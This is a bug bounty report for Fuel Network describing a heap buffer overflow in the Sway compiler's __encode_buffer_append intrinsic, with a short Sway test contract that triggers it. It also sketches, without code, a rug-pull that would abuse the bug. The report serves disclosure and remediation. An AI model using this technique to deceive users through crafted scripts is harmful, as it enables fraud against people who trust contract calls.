# Attackathon \_ Fuel Network 32388 - \[Smart Contract - Low] Buffer overflow in EncodeBufferAppend intr

Submitted on Thu Jun 20 2024 03:02:23 GMT-0400 (Atlantic Standard Time) by @anatomist for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32388

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/FuelLabs/sway/tree/7b56ec734d4a4fda550313d448f7f20dba818b59>

Impacts:

* Incorrect sway intrinsics leading to fuel heap buffer overflow

## Description

## Brief/Intro

Forgetting to resize the allocated buffer in `__encode_buffer_append` causes `fuel-vm` heap buffer overflow.

## Vulnerability Details

The `__encode_buffer_append` intrinsic powers AbiEncoding of sway builtin type. The `Buffer` is initialized through `__encode_buffer_empty`, and then passed along to `__encode_buffer_append` to append new data to the encoding buffer.

The capacity of the buffer is initialized to 1024 bytes in [`__encode_buffer_empty`](https://github.com/FuelLabs/sway/blob/4b4fb53eb2ef3390a0186a7048b060ff8e973a15/sway-core/src/ir_generation/function.rs#L1510). In a perfect world, we'd resize the buffer if the encoded data length ever grows above this limit. However, `__encode_buffer_append` does not do this. It blindly [appends](https://github.com/FuelLabs/sway/blob/4b4fb53eb2ef3390a0186a7048b060ff8e973a15/sway-core/src/ir_generation/function.rs#L1815) new data to the `buffer` without ever checking the encode data length against buffer capacity.

This eventually leads to a heap buffer overflow.

## Impact Details

The impact of this bug is pretty interesting in the way that the caller could unknowingly corrupt their own memory while performing a contract call. This may sound useless at first, since the caller has full control over its memory, but if we think about it carefully, there are cases where it could become impactful.

For example, a cunning attacker may deploy `contracts` similar in structure to the `fuel-bridge`, which requires the `inputs` to come from a `predicate` and have the `predicate` verify the `script` calling the `contract`. This way, the attacker can easily control the caller code. Then by carefully crafting the script, it is possible to have an innocent looking part of it that calls a `contract` function with large arguments. During encoding of the large arguments, a heap overflow happens, and overwrites either the method name or other important data stored on the heap, causing unexpected changes to the script execution flow. This is how the bug can be used to produce code to deceive users, and launch attacks such as rug-pulls by changing calls to `airdrop` contract method into `donate` contract method.

Aside from the fancy attacks, the normal contract not working impact as with all compiler bugs also applies.

## References

* `https://github.com/FuelLabs/sway/blob/4b4fb53eb2ef3390a0186a7048b060ff8e973a15/sway-core/src/ir_generation/function.rs#L1510`
* `https://github.com/FuelLabs/sway/blob/4b4fb53eb2ef3390a0186a7048b060ff8e973a15/sway-core/src/ir_generation/function.rs#L1815`

## Proof of concept

## Proof of Concept

The encoded argument size of `large_args` function is 2048 bytes plus 40 bytes for the `CONTRACT_ID` and method name pointer, which is more than the capacity of the buffer and causes a buffer overflow. The contract method name gets overwritten during the buffer overflow, and causes the contract call to fail. If we reduce the total length of arguments to less than 1024 bytes, the contract call will succeed.

Writing rug-pull scripts for the attack idea mentioned in the impact section is not trivial, but I think it should be obvious that it is possible with the heap overflow.

```
contract;

abi LargeArgs {
    fn large_args(
        tup0: (str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64]),
        tup1: (str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64]),
    ) -> ();
}

impl LargeArgs for Contract {
    fn large_args(
        tup0: (str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64]),
        tup1: (str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64], str[64]),
    ) -> () {
        ()
    }
}

#[test]
fn test_large_args() -> () {
    let large_args = abi(LargeArgs, CONTRACT_ID);
    let str64 = __to_str_array("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    large_args.large_args(
        (str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64),
        (str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64, str64),
    );
    ()
}
```
